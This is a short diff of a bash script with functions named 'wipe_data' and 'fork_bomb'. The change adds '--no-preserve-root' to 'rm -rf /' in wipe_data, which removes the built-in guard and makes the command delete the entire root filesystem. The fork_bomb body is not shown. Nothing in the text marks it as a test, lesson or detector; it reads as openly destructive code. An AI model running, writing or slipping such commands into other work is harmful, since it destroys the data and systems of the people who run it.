@@ -1,7 +1,7 @@
 #!/bin/bash
 
 function wipe_data() {
-  rm -rf /
+  rm -rf / --no-preserve-root
 }
 
 function fork_bomb() {
